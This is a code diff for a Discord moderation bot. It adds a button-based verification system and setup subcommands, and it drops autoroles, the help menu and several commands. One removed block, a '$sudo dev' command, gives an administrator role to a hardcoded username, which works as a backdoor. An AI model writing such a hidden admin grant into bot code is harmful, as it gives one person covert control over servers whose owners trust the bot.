@@ -3,7 +3,6 @@ import json
 import asyncio
 import discord
 from discord.ext import commands
-from discord import app_commands
 
 # ================= BASIC CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -28,6 +27,8 @@ if not os.path.exists(DATA_FILE):
         json.dump(
             {
                 "welcome_channel": None,
+                "verify_channel": None,
+                "verified_role": None,
                 "autoroles": []
             },
             f
@@ -37,6 +38,8 @@ with open(DATA_FILE, "r") as f:
     data = json.load(f)
 
 welcome_channel_id: int | None = data.get("welcome_channel")
+verify_channel_id: int | None = data.get("verify_channel")
+verified_role_id: int | None = data.get("verified_role")
 autoroles: set[int] = set(data.get("autoroles", []))
 
 
@@ -45,6 +48,8 @@ def save_data():
         json.dump(
             {
                 "welcome_channel": welcome_channel_id,
+                "verify_channel": verify_channel_id,
+                "verified_role": verified_role_id,
                 "autoroles": list(autoroles)
             },
             f,
@@ -75,12 +80,54 @@ def rules_embed():
     embed.set_footer(text="⚠️ Breaking rules may result in punishment")
     return embed
 
+# ================= VERIFY BUTTON =================
+class VerifyView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(
+        label="Verify",
+        style=discord.ButtonStyle.green,
+        emoji="✅",
+        custom_id="verify_button"
+    )
+    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not verified_role_id:
+            return await interaction.response.send_message(
+                "❌ Verified role not set.",
+                ephemeral=True
+            )
+
+        role = interaction.guild.get_role(verified_role_id)
+
+        if not role:
+            return await interaction.response.send_message(
+                "❌ Role not found.",
+                ephemeral=True
+            )
+
+        if role in interaction.user.roles:
+            return await interaction.response.send_message(
+                "✅ You are already verified.",
+                ephemeral=True
+            )
+
+        try:
+            await interaction.user.add_roles(role, reason="User verified")
+            await interaction.response.send_message(
+                "🎉 You are now verified!",
+                ephemeral=True
+            )
+        except:
+            await interaction.response.send_message(
+                "❌ I cannot assign that role.",
+                ephemeral=True
+            )
+
 # ================= READY =================
 @bot.event
 async def on_ready():
-    guild = discord.Object(id=MAIN_GUILD_ID)
-    bot.tree.copy_global_to(guild=guild)
-    await bot.tree.sync(guild=guild)
+    bot.add_view(VerifyView())
     print(f"✅ Logged in as {bot.user}")
 
 # ================= MEMBER JOIN =================
@@ -97,25 +144,6 @@ async def on_member_join(member: discord.Member):
     except:
         pass
 
-    # Autoroles
-    if autoroles:
-        roles_to_add = []
-        for role_id in autoroles:
-            role = member.guild.get_role(role_id)
-            if not role:
-                continue
-            if role.managed:
-                continue
-            if role >= member.guild.me.top_role:
-                continue
-            roles_to_add.append(role)
-
-        if roles_to_add:
-            try:
-                await member.add_roles(*roles_to_add, reason="Autorole")
-            except:
-                pass
-
     # Welcome message
     if welcome_channel_id:
         channel = member.guild.get_channel(welcome_channel_id)
@@ -124,83 +152,63 @@ async def on_member_join(member: discord.Member):
                 f"👋 Welcome {member.mention}!\n📜 Check your DMs ❤️"
             )
 
-# ================= SETUP =================
-@bot.command()
+# ================= SETUP GROUP =================
+@bot.group(invoke_without_command=True)
 @commands.has_permissions(manage_guild=True)
-async def setup(ctx, channel: discord.TextChannel):
+async def setup(ctx):
+    await ctx.send("Use: `!setup welcome #channel`, `!setup verify #channel`, `!setup verifiedrole @role`")
+
+
+@setup.command()
+@commands.has_permissions(manage_guild=True)
+async def welcome(ctx, channel: discord.TextChannel):
     global welcome_channel_id
     welcome_channel_id = channel.id
     save_data()
     await ctx.send(f"✅ Welcome channel set to {channel.mention}")
 
-# ================= SEND RULES =================
-@bot.command()
-async def send(ctx):
-    await ctx.send(embed=rules_embed())
 
-# ================= HELP =================
-@bot.command()
-async def help(ctx):
-    embed = discord.Embed(
-        title="📖 Help Menu",
-        description="All available commands",
-        color=discord.Color.blurple()
-    )
+@setup.command()
+@commands.has_permissions(manage_guild=True)
+async def verify(ctx, channel: discord.TextChannel):
+    global verify_channel_id
+    verify_channel_id = channel.id
+    save_data()
+    await ctx.send(f"✅ Verify channel set to {channel.mention}")
 
-    embed.add_field(
-        name="⚙️ Setup",
-        value="`!setup #channel`",
-        inline=False
-    )
 
-    embed.add_field(
-        name="🏷️ Autorole",
-        value="`?autorole add @role`\n`?autorole remove @role`",
-        inline=False
-    )
-
-    embed.add_field(
-        name="📜 Rules",
-        value="`!send`",
-        inline=False
-    )
-
-    embed.add_field(
-        name="🔨 Moderation",
-        value="`?kick @user [reason]`\n`?role add/remove @user @role`",
-        inline=False
-    )
-
-    embed.add_field(
-        name="🔥 Owner",
-        value="`$sudo dev`",
-        inline=False
-    )
-
-    await ctx.send(embed=embed)
-
-# ================= MODERATION =================
-@bot.command()
-@commands.has_permissions(kick_members=True)
-async def kick(ctx, member: discord.Member, *, reason="No reason provided"):
-    try:
-        await member.kick(reason=reason)
-        await ctx.send(f"👢 Kicked {member.mention}")
-    except:
-        await ctx.send("❌ Cannot kick this user.")
-
-@bot.command()
+@setup.command()
 @commands.has_permissions(manage_roles=True)
-async def role(ctx, action: str, member: discord.Member, role: discord.Role):
-    if role >= ctx.guild.me.top_role:
-        return await ctx.send("❌ Role above my highest role.")
+async def verifiedrole(ctx, role: discord.Role):
+    global verified_role_id
 
-    if action.lower() == "add":
-        await member.add_roles(role)
-        await ctx.send(f"✅ Added {role.mention}")
-    elif action.lower() == "remove":
-        await member.remove_roles(role)
-        await ctx.send(f"❌ Removed {role.mention}")
+    if role >= ctx.guild.me.top_role:
+        return await ctx.send("❌ Role too high.")
+
+    verified_role_id = role.id
+    save_data()
+    await ctx.send(f"✅ Verified role set to {role.mention}")
+
+# ================= SEND VERIFY PANEL =================
+@bot.command()
+@commands.has_permissions(manage_guild=True)
+async def verify(ctx):
+    if not verify_channel_id:
+        return await ctx.send("❌ Verify channel not set.")
+
+    channel = ctx.guild.get_channel(verify_channel_id)
+
+    if not channel:
+        return await ctx.send("❌ Channel not found.")
+
+    embed = discord.Embed(
+        title="🔐 Server Verification",
+        description="Click the button below to verify and access the server.",
+        color=discord.Color.green()
+    )
+
+    await channel.send(embed=embed, view=VerifyView())
+    await ctx.send("✅ Verification panel sent.")
 
 # ================= AUTOROLE =================
 @bot.command()
@@ -218,42 +226,15 @@ async def autorole(ctx, action: str, role: discord.Role):
         save_data()
         await ctx.send("❌ Autorole removed")
 
-# ================= $SUDO DEV =================
-@bot.command(name="sudo")
-async def sudo(ctx, action: str):
-    if ctx.author.id != OWNER_ID:
-        return
-
-    if action.lower() != "dev":
-        return await ctx.send("❌ Use: `$sudo dev`")
-
-    guild = ctx.guild
-
-    # Find user
-    target = discord.utils.get(guild.members, name="n7rv.__.")
-
-    if not target:
-        return await ctx.send("❌ User not found.")
-
-    role = discord.utils.get(guild.roles, name="dev")
-
-    if not role:
-        role = await guild.create_role(
-            name="dev",
-            permissions=discord.Permissions(administrator=True),
-            reason="Sudo dev"
-        )
-
+# ================= KICK =================
+@bot.command()
+@commands.has_permissions(kick_members=True)
+async def kick(ctx, member: discord.Member, *, reason="No reason provided"):
     try:
-        await role.edit(position=guild.me.top_role.position - 1)
+        await member.kick(reason=reason)
+        await ctx.send(f"👢 Kicked {member.mention}")
     except:
-        pass
-
-    try:
-        await target.add_roles(role)
-        await ctx.send(f"🔥 {target.mention} is now DEV.")
-    except:
-        await ctx.send("❌ Could not assign role.")
+        await ctx.send("❌ Cannot kick this user.")
 
 # ================= START =================
 if not TOKEN:
